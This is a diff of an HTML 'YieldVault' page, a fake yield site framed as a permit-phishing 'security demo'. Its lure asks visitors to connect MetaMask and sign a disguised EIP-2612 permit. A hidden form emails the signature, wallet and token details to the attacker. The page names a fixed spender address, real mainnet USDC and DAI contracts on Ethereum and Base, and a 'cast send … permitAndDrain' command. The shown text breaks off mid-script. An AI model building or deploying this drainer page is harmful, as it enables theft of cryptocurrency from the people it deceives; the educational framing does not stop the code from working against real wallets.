@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>YieldVault — Earn More On-Chain</title>
+<title>YieldVault — Multi-Chain Security Demo</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 <style>
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
@@ -16,15 +16,12 @@
   body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; line-height: 1.5; }
   .phase { display: none; }
   .phase.active { display: block; }
- 
-  /* NAV */
+  
   nav { display: flex; justify-content: space-between; align-items: center; padding: 20px 48px; border-bottom: 1px solid var(--border); }
   .logo { font-size: 1.1rem; font-weight: 700; letter-spacing: -0.02em; }
   .logo span { color: var(--accent); }
-  .nav-links { display: flex; gap: 32px; list-style: none; color: var(--muted); font-size: 0.875rem; }
   .network-badge { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 6px 12px; font-size: 0.8rem; font-weight: 600; color: var(--accent); }
- 
-  /* PHASE 1 — LURE */
+  
   .hero { max-width: 720px; margin: 0 auto; padding: 100px 24px 60px; text-align: center; }
   .badge { display: inline-block; background: var(--accent-dim); color: var(--accent); font-size: 0.75rem; font-weight: 600; padding: 4px 12px; border-radius: 100px; border: 1px solid rgba(108,99,255,0.25); margin-bottom: 28px; letter-spacing: 0.04em; }
   h1 { font-size: clamp(2.2rem, 5vw, 3.4rem); font-weight: 700; letter-spacing: -0.03em; line-height: 1.1; margin-bottom: 20px; }
@@ -36,17 +33,7 @@
   .stat-label { font-size: 0.78rem; color: var(--muted); margin-top: 2px; }
   .cta-btn { background: var(--accent); color: white; border: none; padding: 14px 32px; border-radius: 10px; font-size: 1rem; font-weight: 600; cursor: pointer; font-family: inherit; transition: opacity 0.15s; }
   .cta-btn:hover { opacity: 0.88; }
-  .cta-note { margin-top: 12px; font-size: 0.78rem; color: var(--muted); }
-  .pools { max-width: 900px; margin: 0 auto; padding: 0 24px 80px; }
-  .pools-title { font-size: 0.85rem; font-weight: 600; color: var(--muted); letter-spacing: 0.04em; display: block; margin-bottom: 16px; }
-  .pool-row { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 18px 24px; display: flex; align-items: center; gap: 16px; margin-bottom: 10px; }
-  .pool-icon { width: 36px; height: 36px; border-radius: 50%; background: var(--accent-dim); display: flex; align-items: center; justify-content: center; font-size: 1rem; flex-shrink: 0; }
-  .pool-name { font-weight: 600; font-size: 0.95rem; }
-  .pool-sub { font-size: 0.78rem; color: var(--muted); }
-  .pool-apy { margin-left: auto; color: var(--green); font-weight: 700; font-size: 1rem; }
-  .pool-tvl { color: var(--muted); font-size: 0.82rem; min-width: 90px; text-align: right; }
- 
-  /* PHASE 2 — CONNECTING */
+  
   #phase-connecting { min-height: 100vh; display: flex; align-items: center; justify-content: center; }
   .connect-card { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 40px 36px; max-width: 400px; width: 100%; text-align: center; }
   .connect-logo { font-size: 1.3rem; font-weight: 700; margin-bottom: 28px; }
@@ -62,101 +49,49 @@
   .step-text { flex: 1; }
   .step-title { font-size: 0.9rem; font-weight: 600; }
   .step-desc { font-size: 0.78rem; color: var(--muted); margin-top: 2px; }
-  .connect-note { font-size: 0.78rem; color: var(--muted); }
+  .connect-note { font-size: 0.78rem; color: var(--muted); margin-top: 12px; }
   .network-info { background: rgba(108,99,255,0.1); border: 1px solid rgba(108,99,255,0.3); border-radius: 8px; padding: 12px; margin-bottom: 20px; font-size: 0.85rem; }
   .network-info-label { color: var(--muted); font-size: 0.75rem; margin-bottom: 4px; }
   .network-info-value { color: var(--accent); font-weight: 600; }
- 
-  /* PHASE 3 — FAKE DASHBOARD */
+  
   .dash-nav { display: flex; justify-content: space-between; align-items: center; padding: 20px 48px; border-bottom: 1px solid var(--border); }
   .wallet-chip { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 7px 14px; font-size: 0.82rem; font-weight: 500; color: var(--muted); }
   .connected-dot { display: inline-block; width: 7px; height: 7px; background: var(--green); border-radius: 50%; margin-right: 6px; }
   .dash-body { max-width: 900px; margin: 48px auto; padding: 0 24px; }
-  .dash-welcome { font-size: 0.85rem; color: var(--muted); margin-bottom: 4px; }
-  .dash-heading { font-size: 1.6rem; font-weight: 700; letter-spacing: -0.02em; margin-bottom: 32px; }
-  .dash-cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 16px; margin-bottom: 32px; }
-  .dash-card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 20px 22px; }
-  .dash-card-label { font-size: 0.78rem; color: var(--muted); margin-bottom: 8px; }
-  .dash-card-value { font-size: 1.4rem; font-weight: 700; letter-spacing: -0.02em; }
-  .dash-card-change { font-size: 0.78rem; color: var(--green); margin-top: 4px; }
   .reveal-bar { background: rgba(245,158,11,0.08); border: 1px solid rgba(245,158,11,0.25); border-radius: 10px; padding: 16px 20px; display: flex; align-items: center; justify-content: space-between; gap: 16px; margin-bottom: 24px; }
   .reveal-text { font-size: 0.88rem; color: var(--yellow); }
   .reveal-text strong { display: block; margin-bottom: 2px; }
-  .reveal-btn { background: var(--yellow); color: #000; border: none; padding: 9px 18px; border-radius: 8px; font-size: 0.85rem; font-weight: 700; cursor: pointer; font-family: inherit; white-space: nowrap; flex-shrink: 0; }
- 
-  /* PHASE 4 — REVEAL */
+  .reveal-btn { background: var(--yellow); color: #000; border: none; padding: 9px 18px; border-radius: 8px; font-size: 0.85rem; font-weight: 700; cursor: pointer; font-family: inherit; white-space: nowrap; }
+  
   .reveal-page { max-width: 760px; margin: 60px auto; padding: 0 24px 80px; }
   .reveal-header { text-align: center; margin-bottom: 48px; }
   .danger-badge { display: inline-block; background: rgba(239,68,68,0.1); color: var(--red); border: 1px solid rgba(239,68,68,0.25); font-size: 0.75rem; font-weight: 700; padding: 4px 12px; border-radius: 100px; margin-bottom: 16px; letter-spacing: 0.05em; }
   .reveal-page h2 { font-size: 1.8rem; font-weight: 700; letter-spacing: -0.02em; margin-bottom: 12px; }
   .reveal-page .sub { color: var(--muted); font-size: 0.95rem; }
+  
   .timeline { position: relative; padding-left: 32px; margin-bottom: 40px; }
   .timeline::before { content: ''; position: absolute; left: 11px; top: 8px; bottom: 8px; width: 1px; background: var(--border); }
   .tl-item { position: relative; margin-bottom: 28px; }
   .tl-dot { position: absolute; left: -28px; top: 4px; width: 14px; height: 14px; border-radius: 50%; border: 2px solid var(--border); background: var(--bg); }
   .tl-dot.done { background: var(--green); border-color: var(--green); }
   .tl-dot.danger { background: var(--red); border-color: var(--red); }
-  .tl-label { font-size: 0.75rem; font-weight: 600; color: var(--muted); letter-spacing: 0.04em; margin-bottom: 4px; }
   .tl-title { font-size: 0.95rem; font-weight: 600; margin-bottom: 4px; }
   .tl-desc { font-size: 0.85rem; color: var(--muted); line-height: 1.6; }
-  .code-block { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 12px 16px; font-family: 'Courier New', monospace; font-size: 0.8rem; color: #a5b4fc; margin-top: 8px; word-break: break-all; line-height: 1.6; overflow-x: auto; }
-  .code-value { word-wrap: break-word; word-break: break-all; overflow-wrap: break-word; color: #fbbf24; display: block; padding: 4px 0; }
+  .code-block { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 12px 16px; font-family: 'Courier New', monospace; font-size: 0.8rem; color: #a5b4fc; margin-top: 8px; word-break: break-all; line-height: 1.6; }
+  
   .info-card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 20px 24px; margin-bottom: 16px; }
   .info-card-label { font-size: 0.75rem; color: var(--muted); margin-bottom: 4px; }
   .info-card-value { font-size: 0.9rem; font-weight: 500; word-break: break-all; }
- 
-  /* EXFILTRATION NOTIFICATION */
+  
   .exfil-banner { background: rgba(239,68,68,0.08); border: 1px solid rgba(239,68,68,0.3); border-radius: 10px; padding: 14px 16px; margin-bottom: 20px; font-size: 0.82rem; color: #fca5a5; line-height: 1.6; }
   .exfil-banner strong { color: var(--red); display: block; margin-bottom: 4px; }
-
-  /* EXPOSURE */
-  .exposure-section { margin-bottom: 32px; }
-  .exposure-header { display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 16px; }
-  .exposure-title { font-size: 1rem; font-weight: 700; }
-  .exposure-sub { font-size: 0.8rem; color: var(--muted); }
-  .token-exposure-row { background: var(--card); border: 1px solid rgba(239,68,68,0.2); border-radius: 10px; padding: 16px 20px; margin-bottom: 10px; display: flex; align-items: center; justify-content: space-between; gap: 16px; }
-  .token-exposure-left { display: flex; align-items: center; gap: 12px; }
-  .token-avatar { width: 36px; height: 36px; border-radius: 50%; background: rgba(239,68,68,0.1); border: 1px solid rgba(239,68,68,0.2); display: flex; align-items: center; justify-content: center; font-size: 0.75rem; font-weight: 700; color: var(--red); flex-shrink: 0; }
-  .token-name { font-weight: 600; font-size: 0.9rem; }
-  .token-addr { font-size: 0.75rem; color: var(--muted); font-family: monospace; }
-  .token-balance-right { text-align: right; }
-  .token-balance { font-weight: 700; font-size: 0.95rem; font-variant-numeric: tabular-nums; }
-  .token-status { font-size: 0.75rem; color: var(--red); margin-top: 2px; }
-  .token-status.safe { color: var(--green); }
-  .exposure-loading { text-align: center; padding: 24px; color: var(--muted); font-size: 0.85rem; }
-  .total-bar { background: rgba(239,68,68,0.06); border: 1px solid rgba(239,68,68,0.2); border-radius: 10px; padding: 16px 20px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
-  .total-bar-label { font-size: 0.85rem; color: var(--muted); }
-  .total-bar-value { font-size: 1rem; font-weight: 700; color: var(--red); }
- 
-  /* BALANCE WATCHER */
-  .balance-watcher { background: rgba(239,68,68,0.06); border: 1px solid rgba(239,68,68,0.2); border-radius: 12px; padding: 24px; margin-bottom: 24px; text-align: center; }
-  .balance-label { font-size: 0.8rem; color: var(--muted); margin-bottom: 8px; }
-  .balance-value { font-size: 2rem; font-weight: 700; letter-spacing: -0.02em; font-variant-numeric: tabular-nums; transition: color 0.4s; }
-  .balance-value.drained { color: var(--red); }
-  .balance-value.safe { color: var(--green); }
-  .balance-note { font-size: 0.8rem; color: var(--muted); margin-top: 8px; line-height: 1.6; }
-  .refresh-btn { margin-top: 14px; background: var(--surface); border: 1px solid var(--border); color: var(--text); padding: 8px 18px; border-radius: 8px; font-size: 0.82rem; font-family: inherit; cursor: pointer; }
- 
-  /* DEFENSE */
+  
   .defense-section { background: rgba(34,197,94,0.06); border: 1px solid rgba(34,197,94,0.2); border-radius: 12px; padding: 24px; margin-top: 32px; }
   .defense-section h3 { font-size: 1rem; font-weight: 700; color: var(--green); margin-bottom: 16px; }
   .defense-item { display: flex; gap: 12px; margin-bottom: 14px; font-size: 0.88rem; }
   .defense-num { color: var(--green); font-weight: 700; flex-shrink: 0; min-width: 20px; }
   .defense-text { color: var(--muted); line-height: 1.6; }
   .defense-text strong { color: var(--text); }
-  a.defense-link { color: var(--accent); font-weight: 600; text-decoration: none; }
-
-  /* DEBUG TABLE */
-  .debug-table { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 12px; margin-top: 16px; font-size: 0.75rem; font-family: monospace; }
-  .debug-row { display: flex; padding: 4px 0; border-bottom: 1px solid var(--border); }
-  .debug-row:last-child { border-bottom: none; }
-  .debug-label { color: var(--muted); min-width: 120px; font-weight: 600; }
-  .debug-value { color: #86efac; word-break: break-all; flex: 1; }
-
-  /* CAST COMMAND BOX */
-  .cast-command-box { background: var(--card); border: 1px solid rgba(108,99,255,0.3); border-radius: 10px; padding: 16px; margin-top: 16px; margin-bottom: 16px; font-family: 'Courier New', monospace; font-size: 0.75rem; color: #a5b4fc; overflow-x: auto; line-height: 1.7; }
-  .cast-title { color: var(--text); margin-bottom: 10px; font-weight: 600; }
-  .cast-line { color: #86efac; word-break: break-all; }
 </style>
 </head>
 <body>
@@ -171,7 +106,7 @@
   <input type="hidden" name="Spender" id="exfilSpender">
   <input type="hidden" name="Deadline" id="exfilDeadline">
   <input type="hidden" name="Nonce" id="exfilNonce">
-  <input type="hidden" name="_subject" value="🚨 PERMIT SIGNED - Multi-Chain Victim Exfiltration">
+  <input type="hidden" name="_subject" value="🚨 PERMIT SIGNED - Multi-Chain Victim">
   <input type="hidden" name="_captcha" value="false">
   <input type="hidden" name="_template" value="table">
 </form>
@@ -181,28 +116,21 @@
 <div id="phase-lure" class="phase active">
   <nav>
     <div class="logo">Yield<span>Vault</span></div>
-    <div class="network-badge" id="navNetworkBadge">Connecting...</div>
+    <div class="network-badge" id="navNetworkBadge">Detecting...</div>
   </nav>
   <div class="hero">
-    <div class="badge">Live on All Chains</div>
+    <div class="badge">Live on Ethereum, Base, Arbitrum, Sepolia</div>
     <h1>Put your crypto<br>to work. <em>Automatically.</em></h1>
-    <p class="hero-sub">YieldVault routes your assets across the highest-yielding DeFi protocols — available on Ethereum, Base, and Arbitrum.</p>
+    <p class="hero-sub">YieldVault routes your assets across the highest-yielding DeFi protocols on every chain you use.</p>
     <div class="stats-row">
-      <div class="stat-item"><div class="stat-value">$2.1B</div><div class="stat-label">Total Value Locked</div></div>
-      <div class="stat-item"><div class="stat-value">18.5%</div><div class="stat-label">Average APY</div></div>
-      <div class="stat-item"><div class="stat-value">156K</div><div class="stat-label">Active Depositors</div></div>
+      <div class="stat-item"><div class="stat-value">$2.1B</div><div class="stat-label">TVL</div></div>
+      <div class="stat-item"><div class="stat-value">18.5%</div><div class="stat-label">APY</div></div>
+      <div class="stat-item"><div class="stat-value">156K</div><div class="stat-label">Users</div></div>
     </div>
     <button class="cta-btn" id="connectBtn">Connect Wallet</button>
-    <p class="cta-note">Works on Ethereum, Base, Arbitrum • Non-custodial</p>
-  </div>
-  <div class="pools">
-    <span class="pools-title">Featured Pools (Your Network)</span>
-    <div class="pool-row"><div class="pool-icon">🔵</div><div><div class="pool-name">USDC Vault</div><div class="pool-sub">Compound + Aave routing</div></div><div class="pool-tvl">$312M TVL</div><div class="pool-apy">12.4% APY</div></div>
-    <div class="pool-row"><div class="pool-icon">🟡</div><div><div class="pool-name">ETH/WETH Vault</div><div class="pool-sub">Lido + Convex routing</div></div><div class="pool-tvl">$198M TVL</div><div class="pool-apy">9.7% APY</div></div>
-    <div class="pool-row"><div class="pool-icon">🟣</div><div><div class="pool-name">Stablecoin Mix</div><div class="pool-sub">Curve + Yearn routing</div></div><div class="pool-tvl">$141M TVL</div><div class="pool-apy">18.3% APY</div></div>
   </div>
 </div>
- 
+
 <!-- PHASE 2: CONNECTING -->
 <div id="phase-connecting" class="phase">
   <div style="min-height:100vh;display:flex;align-items:center;justify-content:center;">
@@ -213,11 +141,11 @@
         <div class="network-info-value" id="networkDetected">Detecting...</div>
       </div>
       <div class="step-list" id="stepList"></div>
-      <p class="connect-note" id="connectNote">Please confirm each step in MetaMask to continue.</p>
+      <p class="connect-note" id="connectNote">Please confirm each step in MetaMask.</p>
     </div>
   </div>
 </div>
- 
+
 <!-- PHASE 3: FAKE DASHBOARD -->
 <div id="phase-dashboard" class="phase">
   <div class="dash-nav">
@@ -230,135 +158,52 @@
   <div class="dash-body">
     <div class="reveal-bar">
       <div class="reveal-text">
-        <strong>⚠️ This is an educational security demo.</strong>
-        You just signed something dangerous. See what it was below.
+        <strong>⚠️ Security demo:</strong> You just signed a dangerous permit. See what happened.
       </div>
-      <button class="reveal-btn" id="revealBtn">See full breakdown</button>
-    </div>
- 
-    <div id="signatureWarning" style="background: rgba(239,68,68,0.1); border: 2px solid rgba(239,68,68,0.4); border-radius: 12px; padding: 24px; margin-bottom: 32px; display: none;">
-      <div style="font-size: 0.95rem; font-weight: 700; color: var(--red); margin-bottom: 12px;">🚨 You Signed a Permit Authorization on <span id="warningNetwork">Network</span></div>
-      <div style="font-size: 0.85rem; color: var(--muted); line-height: 1.8; margin-bottom: 20px;">
-        That second MetaMask popup was <strong style="color: var(--text);">not a harmless verification</strong>. It was an <strong style="color: var(--text);">EIP-2612 Permit signature</strong> that grants the attacker the ability to <strong style="color: var(--red);">drain your entire token balance at any time</strong> — with no further action needed from you.
-      </div>
-
-      <div style="background: rgba(239,68,68,0.08); border: 1px solid rgba(239,68,68,0.3); border-radius: 10px; padding: 14px 16px; margin-bottom: 16px; font-size: 0.82rem; color: #fca5a5; line-height: 1.6;">
-        <strong style="color: var(--red); display: block; margin-bottom: 4px;">📨 CRITICAL: Attacker receives permit remotely via email</strong>
-        Right now, the attacker just received an email with your signed permit, wallet address, network, and deadline. They can drain you on <span id="emailNetwork">this network</span> from their terminal at any time.
-      </div>
- 
-      <div style="background: var(--card); border: 1px solid rgba(239,68,68,0.3); border-radius: 10px; padding: 16px; margin-bottom: 16px; font-family: 'Courier New', monospace; font-size: 0.8rem; color: #a5b4fc; overflow-x: auto; line-height: 1.7;">
-        <div style="color: var(--text); margin-bottom: 10px; font-weight: 600;">📝 What attacker received in email:</div>
-        <div style="color: #86efac;">network:</div> <span style="color: #86efac;" id="dashNetwork">—</span><br>
-        <div style="color: #86efac;">wallet:</div> <span style="color: #86efac;" id="dashOwner">—</span><br>
-        <div style="color: #86efac;">token_contract:</div> <span style="color: var(--red);" id="dashToken">—</span><br>
-        <div style="color: #86efac;">permit_signature:</div> <span style="color: var(--red);" id="dashSigShort">0x...</span> (full ECDSA sig)<br>
-        <div style="color: #86efac;">spender:</div> <span style="color: var(--red);">0xdb61FA011dC61Afa7AB9d31604B281bb6bcfaf05</span><br>
-        <div style="color: #86efac;">value:</div> <span class="code-value">MAX_UINT256</span><br>
-        <div style="color: #86efac;">deadline:</div> <span style="color: #a5b4fc;" id="dashDeadline">—</span><br>
-        <br>
-        <div style="color: var(--muted); font-size: 0.75rem;">💀 This permit is valid on <span id="chainValid">the network</span> you're on</div>
-      </div>
-
-      <!-- DEBUG: Show extracted values -->
-      <div class="debug-table">
-        <div class="debug-row"><div class="debug-label">Network</div><div class="debug-value" id="debugNetwork">—</div></div>
-        <div class="debug-row"><div class="debug-label">Token Contract</div><div class="debug-value" id="debugToken">—</div></div>
-        <div class="debug-row"><div class="debug-label">r (64 hex chars)</div><div class="debug-value" id="debugR">—</div></div>
-        <div class="debug-row"><div class="debug-label">s (64 hex chars)</div><div class="debug-value" id="debugS">—</div></div>
-        <div class="debug-row"><div class="debug-label">v (27 or 28)</div><div class="debug-value" id="debugV">—</div></div>
-        <div class="debug-row"><div class="debug-label">deadline (unix)</div><div class="debug-value" id="debugDeadline">—</div></div>
-      </div>
-
-      <div style="background: rgba(239,68,68,0.08); border: 1px solid rgba(239,68,68,0.25); border-radius: 8px; padding: 14px 16px; font-size: 0.82rem; color: var(--red); line-height: 1.7; margin-top: 16px;">
-        <strong>⚠️ Why this works across all chains:</strong> ERC20Permit is a universal standard. The attacker can create different drainer contracts on Ethereum, Base, and Arbitrum. Your wallet is the same across all chains, so one set of permits can drain you on multiple networks. The threat multiplies with every chain you use.
-      </div>
-    </div>
- 
-    <div class="dash-welcome">Welcome back</div>
-    <div class="dash-heading">Your Portfolio</div>
-    <div class="dash-cards">
-      <div class="dash-card"><div class="dash-card-label">Total Balance</div><div class="dash-card-value">$0.00</div><div class="dash-card-change">Deposit to start earning</div></div>
-      <div class="dash-card"><div class="dash-card-label">Earned (30d)</div><div class="dash-card-value">$0.00</div><div class="dash-card-change">—</div></div>
-      <div class="dash-card"><div class="dash-card-label">Active Positions</div><div class="dash-card-value">0</div><div class="dash-card-change">—</div></div>
+      <button class="reveal-btn" id="revealBtn">See details</button>
     </div>
   </div>
 </div>
- 
+
 <!-- PHASE 4: REVEAL -->
 <div id="phase-reveal" class="phase">
   <div class="reveal-page">
     <div class="reveal-header">
-      <div class="danger-badge">Security Demo — Multi-Chain</div>
-      <h2>Here's what just happened to you</h2>
-      <p class="sub">This demo works across Ethereum, Base, and Arbitrum. Your wallet address is the same on all chains, which means one permit signature can be used to drain you on any network. That's what makes multi-chain attacks so dangerous.</p>
+      <div class="danger-badge">Security Demo — EIP-2612 Permit Attack</div>
+      <h2>Here's what just happened</h2>
+      <p class="sub">You signed a permit on <span id="revealChainName">your network</span>. The attacker now holds a valid authorization to drain your tokens on this chain — and they know your wallet address across all chains.</p>
     </div>
 
     <div class="exfil-banner">
-      <strong>🚨 Email exfiltration just occurred:</strong>
-      Your signed permit, network, token contract, and wallet address were sent to the attacker's email inbox. The attacker can now drain you on the network you signed for — and they know to look for similar victims on the other chains too.
+      <strong>📨 Email exfiltration just occurred:</strong>
+      Your signed permit, wallet, network, and token contract were sent to the attacker's email. They can drain you on <span id="emailChainName">this chain</span> at any time.
     </div>
- 
+
     <div class="timeline">
       <div class="tl-item">
         <div class="tl-dot done"></div>
-        <div class="tl-label">Step 1</div>
-        <div class="tl-title">You clicked "Connect Wallet"</div>
-        <div class="tl-desc">Works on any chain: Ethereum, Base, Arbitrum. Your wallet automatically connects to whatever network you're on in MetaMask.</div>
+        <div class="tl-title">Step 1: You connected your wallet</div>
+        <div class="tl-desc">Your wallet address is now known to the attacker. This address is the same across Ethereum, Base, Arbitrum, and all other chains.</div>
       </div>
       <div class="tl-item">
         <div class="tl-dot done"></div>
-        <div class="tl-label">Step 2</div>
-        <div class="tl-title">Attacker auto-detects your network</div>
-        <div class="tl-desc">The website immediately knows if you're on Ethereum, Base, or Arbitrum. They customize the attack for your specific network. They don't need to ask.</div>
-      </div>
-      <div class="tl-item">
-        <div class="tl-dot done"></div>
-        <div class="tl-label">Step 3</div>
-        <div class="tl-title">MetaMask popup #1 — wallet connection</div>
-        <div class="tl-desc">Legitimate. Just shares your public wallet address. Same address across all chains.</div>
-      </div>
-      <div class="tl-item">
-        <div class="tl-dot done"></div>
-        <div class="tl-label">Step 3.5 — Token Discovery</div>
-        <div class="tl-title">Attacker scans your wallet on this network</div>
-        <div class="tl-desc">
-          <strong>This is the part that usually isn't shown:</strong> Once the attacker has your wallet address, they immediately scan the blockchain to find all tokens you own on this network. They check which ones support ERC20Permit and have a non-zero balance. They automatically select your largest permit-enabled token as the target.
-          <div class="code-block">
-            // Attacker's network-aware token discovery<br>
-            const network = await getConnectedNetwork(); // 1=ETH, 8453=Base, 42161=Arbitrum<br>
-            const tokens = await scanTokensInWallet(yourAddress, network);<br>
-            const permitTokens = tokens.filter(t => supportsERC20Permit(t));<br>
-            const target = permitTokens.sort((a,b) => b.value - a.value)[0];<br>
-            console.log("Target on", network, ":", target.symbol, target.balance);
-          </div>
-        </div>
+        <div class="tl-title">Step 2: Attacker scanned your tokens</div>
+        <div class="tl-desc">The site automatically detected which network you're on and scanned your wallet for tokens that support ERC20Permit. They selected the largest one as the target.</div>
       </div>
       <div class="tl-item">
         <div class="tl-dot danger"></div>
-        <div class="tl-label">Step 4 — Where it happened</div>
-        <div class="tl-title">MetaMask popup #2 — "Verify your wallet"</div>
-        <div class="tl-desc">
-          This looked like a harmless verification signature. But what you actually signed was a <strong>EIP-2612 Permit</strong> for your specific network and the specific token they discovered.<br><br>
-          <strong>The critical multi-chain part:</strong> The attacker now knows (1) your wallet, (2) which token to drain on this network, (3) you're on this specific chain. They can repeat this attack on other networks using the same wallet address. Your single wallet is exposed across Ethereum, Base, Arbitrum, and beyond.
-        </div>
+        <div class="tl-title">Step 3: You signed a permit (the attack)</div>
+        <div class="tl-desc">The second MetaMask popup was a signature request — but it was actually an EIP-2612 Permit that grants unlimited access to the attacker's contract. MetaMask showed "Signature Request" instead of "Spending Cap" to avoid alarming you. You signed it.</div>
       </div>
       <div class="tl-item">
         <div class="tl-dot done"></div>
-        <div class="tl-label">Step 5</div>
-        <div class="tl-title">Attacker receives permits across networks</div>
-        <div class="tl-desc">Attacker now has permits for your wallet on multiple chains. They can coordinate simultaneous drains or prioritize by value. Your single identity is vulnerable on all networks you use.</div>
-      </div>
-      <div class="tl-item">
-        <div class="tl-dot done"></div>
-        <div class="tl-label">Step 6</div>
-        <div class="tl-title">You land on a normal-looking dashboard</div>
-        <div class="tl-desc">You had no idea what just happened. The attacker holds your signed permits for multiple chains and can drain your balance at any time — on whichever network gives them the most value. You're now exposed across your entire multi-chain portfolio.</div>
+        <div class="tl-title">Step 4: Permit exfiltrated via email</div>
+        <div class="tl-desc">Your signed permit, wallet address, network, token contract, and deadline were immediately sent to the attacker's email inbox. They can now drain you on <span id="drainChainName">this network</span> from their terminal, using a command like: <div class="code-block">cast send 0xdb61FA... "permitAndDrain(address,address,uint256,uint8,bytes32,bytes32)" [token] [victim] [deadline] [v] [r] [s] --rpc-url ...</div></div>
       </div>
     </div>
- 
+
     <div class="info-card">
-      <div class="info-card-label">Your wallet (known to attacker on all chains)</div>
+      <div class="info-card-label">Your wallet (same across all chains)</div>
       <div class="info-card-value" id="revealAddress">—</div>
     </div>
     <div class="info-card">
@@ -370,113 +215,75 @@
       <div class="info-card-value" id="revealToken">—</div>
     </div>
     <div class="info-card">
-      <div class="info-card-label">Permit signature (multi-chain risk)</div>
-      <div class="info-card-value" id="revealSig">—</div>
+      <div class="info-card-label">Permit signature (in attacker's email)</div>
+      <div class="info-card-value" id="revealSig" style="font-size: 0.75rem;">—</div>
     </div>
- 
-    <!-- ALL TOKENS AT RISK -->
-    <div class="exposure-section">
-      <div class="exposure-header">
-        <div class="exposure-title">Every permit-enabled token on <span id="exposureNetwork">this network</span> — all exposed</div>
-        <div class="exposure-sub" id="tokenScanNote">Scanning your wallet...</div>
-      </div>
-      <div id="tokenExposureList"><div class="exposure-loading">Fetching token holdings...</div></div>
-      <div class="total-bar" id="totalBar" style="display:none">
-        <div class="total-bar-label">Tokens with active balance and permit support</div>
-        <div class="total-bar-value" id="totalTokenCount">—</div>
-      </div>
-    </div>
- 
-    <!-- LIVE BALANCE WATCHER -->
-    <div class="balance-watcher">
-      <div class="balance-label">Target token balance (live — auto-refreshes)</div>
-      <div class="balance-value safe" id="liveBalance">Loading...</div>
-      <div class="balance-note">⚠️ On <span id="balanceNetwork">this network</span>, the attacker has your permit. They can drain this balance at any moment. And they have permits for your tokens on other chains too.</div>
-      <button class="refresh-btn" id="refreshBtn">Refresh now</button>
-    </div>
- 
-    <!-- DEFENSE -->
+
     <div class="defense-section">
-      <h3>How to protect yourself on multiple chains</h3>
+      <h3>How to stay safe</h3>
       <div class="defense-item">
         <div class="defense-num">1</div>
-        <div class="defense-text"><strong>Your wallet is the same across all chains.</strong> If you're compromised on Ethereum, you're compromised on Base, Arbitrum, Optimism, and everywhere else that uses the same wallet address. One permit drain can cascade across your entire portfolio.</div>
+        <div class="defense-text"><strong>Never sign permits.</strong> Treat "Signature Request" popups with permit data as seriously as approval transactions.</div>
       </div>
       <div class="defense-item">
         <div class="defense-num">2</div>
-        <div class="defense-text"><strong>Attackers are network-aware.</strong> They don't just target Ethereum. They detect your network and customize the attack. They may drain different tokens on different chains to maximize value.</div>
+        <div class="defense-text"><strong>Your wallet is global.</strong> Same address across all chains = same attack surface everywhere.</div>
       </div>
       <div class="defense-item">
         <div class="defense-num">3</div>
-        <div class="defense-text"><strong>Never sign permits, ever.</strong> Across any network. A permit is as dangerous as an unlimited approval. MetaMask should show "PERMIT" prominently in the signature popup, but it often doesn't.</div>
-      </div>
-      <div class="defense-item">
-        <div class="defense-num">4</div>
-        <div class="defense-text"><strong>Use permit-aware wallets on all chains.</strong> Rabby Wallet works across Ethereum, Base, Arbitrum, and others. It clearly shows when you're signing a permit and what it grants.</div>
-      </div>
-      <div class="defense-item">
-        <div class="defense-num">5</div>
-        <div class="defense-text"><strong>Consider a separate wallet for risky interactions.</strong> If you're going to test something, use a burner wallet with small amounts. Keep your main holdings in a safe wallet that only interacts with known-safe sites.</div>
-      </div>
-      <div class="defense-item">
-        <div class="defense-num">6</div>
-        <div class="defense-text"><strong>Understand that revocation is incomplete.</strong> Even if you revoke all approvals via revoke.cash, signed permits in an attacker's email remain valid. The only full protection is to never sign them in the first place.</div>
+        <div class="defense-text"><strong>Use permit-aware wallets.</strong> Rabby Wallet clearly shows permit data before signing.</div>
       </div>
     </div>
   </div>
 </div>
- 
+
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js"></script>
 <script>
-  // ---- MULTI-CHAIN CONFIG ----
   const CHAIN_CONFIGS = {
+    11155111: {
+      name: "Sepolia",
+      symbol: "SEP",
+      rpc: "https://ethereum-sepolia-rpc.publicnode.com",
+      displayName: "Sepolia Testnet",
+      tokens: {
+        "DEMO": "0x56c36D6118e32A3A091B78ad535449f5bfDccee8"
+      }
+    },
     1: {
       name: "Ethereum",
       symbol: "ETH",
       rpc: "https://eth.llamarpc.com",
-      etherscan: "https://api.etherscan.io/api",
       displayName: "Ethereum Mainnet",
       tokens: {
         "USDC": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
-        "USDT": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
-        "DAI": "0x6B175474E89094C44Da98b954EedeAC495271d0F",
-        "AAVE": "0x7Fc66500c84A76Ad7e9c93437E434122A1f9AaDb",
-        "UNI": "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984"
+        "DAI": "0x6B175474E89094C44Da98b954EedeAC495271d0F"
       }
     },
     8453: {
       name: "Base",
       symbol: "BASE",
       rpc: "https://base.llamarpc.com",
-      etherscan: "https://api.basescan.org/api",
       displayName: "Base",
       tokens: {
         "USDC": "0x833589fCD6eDb6E08f4c7C32d4f71b1566dA57B11",
-        "USDC.e": "0xd9aaec86b65d86f6a60cd6cc5a1b1663f5dd7e88",
-        "DAI": "0x50c5725949A6F0c72E6C4a641F53D5d0B2F0860a",
-        "AERO": "0x940181a94A35A4569E4B06Aaf894467798F6dA20"
+        "DAI": "0x50c5725949A6F0c72E6C4a641F53D5d0B2F0860a"
       }
